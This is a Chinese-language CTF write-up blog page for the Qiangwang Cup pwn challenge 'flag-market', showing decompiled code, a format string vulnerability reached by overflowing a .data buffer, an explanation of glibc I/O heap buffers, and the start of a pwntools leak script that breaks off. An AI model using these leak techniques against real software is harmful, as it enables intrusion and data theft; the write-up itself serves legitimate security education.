@@ -1,0 +1,410 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第九届强网杯线上赛Pwn_flag-market | A Secret Site</title><meta name="author" content="youdiscovered1t"><meta name="copyright" content="youdiscovered1t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="第九届强网杯线上赛PWN_flag-market一、题目 二、信息搜集下载题目给的附件，查看文件ctf.xinetd之后，知道我们的可执行程序名为chall：  这个文件在附件中的bin目录下。 通过file命令查看文件类型：  通过checksec命令查看文件保护措施：  三、反汇编文件开始分析1、分析程序基本逻辑将chall文件丢入64位的IDA Pro中，开始反汇编操作，由于汇编代码过长，我">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第九届强网杯线上赛Pwn_flag-market">
+<meta property="og:url" content="https://beini-faxianl.github.io/2025/10/25/flag-market/index.html">
+<meta property="og:site_name" content="A Secret Site">
+<meta property="og:description" content="第九届强网杯线上赛PWN_flag-market一、题目 二、信息搜集下载题目给的附件，查看文件ctf.xinetd之后，知道我们的可执行程序名为chall：  这个文件在附件中的bin目录下。 通过file命令查看文件类型：  通过checksec命令查看文件保护措施：  三、反汇编文件开始分析1、分析程序基本逻辑将chall文件丢入64位的IDA Pro中，开始反汇编操作，由于汇编代码过长，我">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://beini-faxianl.github.io/img/cover.png">
+<meta property="article:published_time" content="2025-10-25T13:05:00.000Z">
+<meta property="article:modified_time" content="2025-10-25T13:05:00.000Z">
+<meta property="article:author" content="youdiscovered1t">
+<meta property="article:tag" content="IO_FILE">
+<meta property="article:tag" content="fmt格式化字符串漏洞">
+<meta property="article:tag" content="任意地址读取">
+<meta property="article:tag" content="堆">
+<meta property="article:tag" content="泄露libc基址">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://beini-faxianl.github.io/img/cover.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "第九届强网杯线上赛Pwn_flag-market",
+  "url": "https://beini-faxianl.github.io/2025/10/25/flag-market/",
+  "image": "https://beini-faxianl.github.io/img/cover.png",
+  "datePublished": "2025-10-25T13:05:00.000Z",
+  "dateModified": "2025-10-25T13:05:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "youdiscovered1t",
+      "url": "https://beini-faxianl.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://beini-faxianl.github.io/2025/10/25/flag-market/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '第九届强网杯线上赛Pwn_flag-market',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/author.png" onerror="this.onerror=null;this.src='/img/friend_404.png'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-coffee"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">A Secret Site</span></a><a class="nav-page-title" href="/"><span class="site-name">第九届强网杯线上赛Pwn_flag-market</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-coffee"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">第九届强网杯线上赛Pwn_flag-market</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-25T13:05:00.000Z" title="发表于 2025-10-25 21:05:00">2025-10-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-25T13:05:00.000Z" title="更新于 2025-10-25 21:05:00">2025-10-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/%E6%AF%94%E8%B5%9B/">比赛</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/%E6%AF%94%E8%B5%9B/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/%E6%AF%94%E8%B5%9B/WP/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="第九届强网杯线上赛PWN-flag-market"><a href="#第九届强网杯线上赛PWN-flag-market" class="headerlink" title="第九届强网杯线上赛PWN_flag-market"></a>第九届强网杯线上赛PWN_flag-market</h1><h2 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h2><p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203039923-1200912138.png"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/flag-market/3622178-20251023203039923-1200912138.png" alt="img"></a></p>
+<h2 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h2><p>下载题目给的附件，查看文件ctf.xinetd之后，知道我们的可执行程序名为chall：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203727187-200295548.png"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/flag-market/3622178-20251023203727187-200295548.png" alt="img"></a></p>
+<p>这个文件在附件中的bin目录下。</p>
+<p>通过<code>file</code>命令查看文件类型：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203957917-176528406.png"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/flag-market/3622178-20251023203957917-176528406.png" alt="image"></a></p>
+<p>通过<code>checksec</code>命令查看文件保护措施：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023204015264-1836719827.png"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/flag-market/3622178-20251023204015264-1836719827.png" alt="image"></a></p>
+<h2 id="三、反汇编文件开始分析"><a href="#三、反汇编文件开始分析" class="headerlink" title="三、反汇编文件开始分析"></a>三、反汇编文件开始分析</h2><h3 id="1、分析程序基本逻辑"><a href="#1、分析程序基本逻辑" class="headerlink" title="1、分析程序基本逻辑"></a>1、分析程序基本逻辑</h3><p>将chall文件丢入64位的IDA Pro中，开始反汇编操作，由于汇编代码过长，我们通过看C语言代码来把握整体代码逻辑：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __usercall main@&lt;rax&gt;(<span class="type">char</span> **a1@&lt;rsi&gt;, <span class="type">char</span> **a2@&lt;rdx&gt;, __int64 a3@&lt;rbp&gt;, __int64 a4@&lt;rdi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// rt1</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp-8Ch] [rbp-8Ch]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp-80h] [rbp-80h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v12; <span class="comment">// [rsp-71h] [rbp-71h]</span></span><br><span class="line">  <span class="type">signed</span> __int16 v13; <span class="comment">// [rsp-6Dh] [rbp-6Dh]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp-68h] [rbp-68h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v17 = a3;</span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_401336(a4, a1, a2);</span><br><span class="line">  v12 = <span class="string">&#x27;alf/&#x27;</span>;</span><br><span class="line">  v13 = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">  v11 = my_fopen(&amp;v12, &amp;unk_402008);</span><br><span class="line">  dword_40430C = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;welcome to flag market!\ngive me money to buy my flag,\nchoice: \n1.take my money\n2.exit&quot;</span>);</span><br><span class="line">    my_memset(&amp;v14, <span class="number">0LL</span>, <span class="number">16LL</span>);</span><br><span class="line">    v4 = &amp;v14;</span><br><span class="line">    my_read();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)my_atoi() != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    my_puts(<span class="string">&quot;how much you want to pay?&quot;</span>);</span><br><span class="line">    my_memset(&amp;v14, <span class="number">0LL</span>, <span class="number">16LL</span>);</span><br><span class="line">    v4 = &amp;v14;</span><br><span class="line">    my_read();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)my_atoi() == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(aThankYouForPay);</span><br><span class="line">      <span class="keyword">if</span> ( !dword_40430C || (v4 = (__int64 *)<span class="number">64</span>, !my_fgets(&amp;v15, <span class="number">64LL</span>, v11)) )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="string">&quot;something is wrong&quot;</span>;</span><br><span class="line">        my_puts(<span class="string">&quot;something is wrong&quot;</span>);</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">64</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="string">&quot;\nThank you for your patronage!&quot;</span>;</span><br><span class="line">          my_puts(<span class="string">&quot;\nThank you for your patronage!&quot;</span>);</span><br><span class="line">          result = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)&amp;v17 + i - <span class="number">80</span>) == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        my_putchar((<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)&amp;v17 + i - <span class="number">80</span>));</span><br><span class="line">        my_sleep(<span class="number">1LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      my_memset(&amp;v15, <span class="number">0LL</span>, <span class="number">64LL</span>);</span><br><span class="line">      my_puts(a1m31mError0mSo);</span><br><span class="line">      my_puts(<span class="string">&quot;opened user.log, please report:&quot;</span>);</span><br><span class="line">      my_memset(aEverythingIsOk, <span class="number">0LL</span>, <span class="number">256LL</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, aEverythingIsOk);</span><br><span class="line">      my_getchar(<span class="string">&quot;%s&quot;</span>, aEverythingIsOk);</span><br><span class="line">      v7 = my_open(<span class="string">&quot;user.log&quot;</span>);</span><br><span class="line">      my_write(v7, aEverythingIsOk, <span class="number">256LL</span>);</span><br><span class="line">      my_puts(aOkNowYouCanExi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      my_printf(aYouAreSoParsim);</span><br><span class="line">      <span class="keyword">if</span> ( dword_40430C )</span><br><span class="line">      &#123;</span><br><span class="line">        my_fclose(v11);</span><br><span class="line">        dword_40430C = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  result = my_exit();</span><br><span class="line">LABEL_16:</span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v8 = v16 - v9;</span><br><span class="line">  <span class="keyword">if</span> ( v16 != v9 )</span><br><span class="line">    result = my___stack_chk_fail(v5, v4, v8);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我已经将一些为命令函数进行了重命名操作，这样便于我们的分析。重命名可以依据经验，也可以通过gdb动态调试来确定函数。</p>
+</blockquote>
+<p>程序首先会通过<code>fopen</code>函数打开根目录下的flag文件，接着会出现两个选择即：</p>
+<ul>
+<li>take my money</li>
+<li>exit</li>
+</ul>
+<p>选择二就直接退出了。</p>
+<p>如果我们选择一，那么程序就会通过<code>read</code>函数来获取你的输入，接着判断你输入的值是否是“-1”：</p>
+<ul>
+<li>是：将打开的flag文件中的内容写入到地址&amp;v15处，然后通过for循环逐字节读取flag。但是，遇到“{”之后就会终止读取。接下来，就是一个向上汇报错误的过程。</li>
+<li>不是：打印一段文字，然后关闭（<code>fclose</code>）打开的flag文件。</li>
+</ul>
+<p>很明显，这一部分出现<code>printf</code>函数，而且该函数并没有指定格式化字符，那么会不会存在格式化字符串漏洞？</p>
+<h3 id="2、格式化字符串漏洞"><a href="#2、格式化字符串漏洞" class="headerlink" title="2、格式化字符串漏洞"></a>2、格式化字符串漏洞</h3><p><code>printf</code>的参数来自<code>.data</code>段：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00000000004041C0 aYouAreSoParsim db &#x27;You are so parsimonious!!!&#x27;,0</span><br></pre></td></tr></table></figure>
+
+<p>如果我们能控制这一部分的数据，就可以造成格式化字符串漏洞。</p>
+<p>观察后，可以发现我们的<code>scanf</code>函数用的格式化字符是<code>%s</code>即可以无限长地输入（只要不输入空白字符），而且输入的位置刚好也在<code>.data</code>段且位置比“aYouAreSoParsim”低：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00000000004040C0 aEverythingIsOk db &#x27;everything is ok~&#x27;,0</span><br></pre></td></tr></table></figure>
+
+<p>那么，格式化字符串漏洞的触发就是通过<code>scanf</code>函数的输入来覆盖“aYouAreSoParsim”部分，接着通过<code>printf</code>函数实现漏洞的触发。</p>
+<h3 id="3、思路"><a href="#3、思路" class="headerlink" title="3、思路"></a>3、思路</h3><p>找到了关键漏洞，我们就要理一下思路，即思考我该怎么做才能获得flag？</p>
+<p>首先，我们肯定不能通过任意地址读来去栈上找flag，因为虽然flag被写在了栈上，但是，后续程序利用了<code>my_memset(&amp;v15, 0LL, 64LL);</code>将该位置的信息全都清空了。</p>
+<p>但是，堆上的flag呢？</p>
+<p>可能有人会有疑惑，堆上哪来的flag，整个程序我都没见过堆操作。</p>
+<p>其实是有的。简单来说，I&#x2F;O类型的函数（如<code>fopen</code>，<code>fgets</code>等）为了提到效率，会用到“缓冲”机制，这个缓冲机制就是通过调用<code>malloc</code>来实现的。</p>
+<p>让我们从一个简单的场景开始，逐步深入。</p>
+<p>场景：如果没有缓冲会怎样？</p>
+<p>想象一下，你的程序要从一个文件中读取1MB（大约一百万字节）的数据。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *fp = fopen(<span class="string">&quot;large_file.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">    fgetc(fp); <span class="comment">// 一次只读一个字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果没有缓冲机制，<code>fgetc</code>的每一次调用都会触发一次系统调用。系统调用是程序从用户态切换到内核态去请求操作系统服务的唯一方式。这个切换过程涉及到上下文保存、权限检查等，开销非常大。</p>
+<p>这意味着，为了读取1MB的数据，你的程序需要进行一百万次的用户态&#x2F;内核态切换。这将会慢得令人无法忍受。</p>
+<p>为了解决这个问题，C标准库（glibc）引入了缓冲机制。</p>
+<p>假设，当你的程序第一次调用<code>fopen</code>打开一个文件时，会发生以下事情：</p>
+<ol>
+<li><strong>创建管理结构</strong>：<code>fopen</code>在内部会调用<code>malloc</code>来开辟一片空间，这片空间中会存放一个叫<code>FILE</code>的结构体（或<code>_IO_FILE_plus</code>），该结构体用来管理：<ul>
+<li>文件的描述符（操作系统给的一个数字）。</li>
+<li>当前读写位置。</li>
+<li>是否发生了错误。</li>
+<li>指向缓冲区的指针。</li>
+</ul>
+</li>
+<li><strong>分配I&#x2F;O缓冲区</strong>：光有管理结构还不够，还需要一个地方来存放从文件里预读出来的数据。这个地方就是I&#x2F;O缓冲区。<ul>
+<li>当你的程序第一次尝试从文件读取数据时（例如，第一次调用<code>fgetc</code>或<code>fgets</code>），<code>_IO_FILE</code>的内部逻辑会检查自己是否有缓冲区。</li>
+<li>如果没有，它就会向内核申请一大块数据，即此时第二次调用了<code>malloc</code>。</li>
+<li>然后，就是读的操作了（它会发出一次系统调用如<code>read</code>），让内核一次性把数据从文件填充到这个新分配的缓冲区里。</li>
+<li>最后，读写函数会从这片缓冲区中操作数据。</li>
+</ul>
+</li>
+</ol>
+<p>在完成了上述初始化之后，后续的I&#x2F;O操作就变得非常高效了：</p>
+<ul>
+<li><code>fgetc</code>的调用，将不再需要任何系统调用。它们只是简单地从那个已经填满数据的堆上缓冲区里，一个接一个地取出字节。这只是纯粹的内存操作，速度极快。</li>
+<li>只有当缓冲区里的数据被全部读完后，下一次读取操作才会再次触发一次系统调用，去请求下一个数据块。</li>
+</ul>
+<p>对于写入操作（如<code>fprintf</code>, <code>fputc</code>），原理也是类似的，这里不再赘述。</p>
+<p>好，了解了这些之后，我们应该知道，堆上为什么也会有flag了吧。</p>
+<p>那么，我们的思路就是，利用格式化字符串漏洞，实现任意地址读取，读到堆上的flag。</p>
+<p>问题又出现了，怎么知道堆的地址呢？</p>
+<p>这又涉及到一个知识点：针对动态链接的程序，在他的libc库中，会存在指向IO缓冲区的指针。</p>
+<blockquote>
+<p>这也很好理解，libc库中有很多的IO函数，那么操作一块堆空间最好的方式就是给我一个指向它的指针。</p>
+</blockquote>
+<p>综上，我们的思路：</p>
+<ol>
+<li>格式化字符串漏洞泄露libc基址。</li>
+<li>通过格式化字符串漏洞泄露堆上的flag。</li>
+</ol>
+<h2 id="四、Poc的构造"><a href="#四、Poc的构造" class="headerlink" title="四、Poc的构造"></a>四、Poc的构造</h2><blockquote>
+<p>根据思路，按部就班地完成Poc的构造。</p>
+</blockquote>
+<h3 id="1、泄露libc基址"><a href="#1、泄露libc基址" class="headerlink" title="1、泄露libc基址"></a>1、泄露libc基址</h3><p>首先分析栈上的构造，程序中的第二个read函数的输入位置为<code>[rbp-60h]</code>。</p>
+<p>flag在栈上的临时位置在<code>[rbp-50h]</code>他们的关系就是：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023213430288-1118781673.png"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/flag-market/3622178-20251023213430288-1118781673.png" alt="img"></a></p>
+<p>写一个测试脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,9999)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*padding</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    payload += <span class="string">f&#x27;%<span class="subst">&#123;i&#125;</span>$p-&#x27;</span>.encode()</span><br><span class="line"></span><br><span 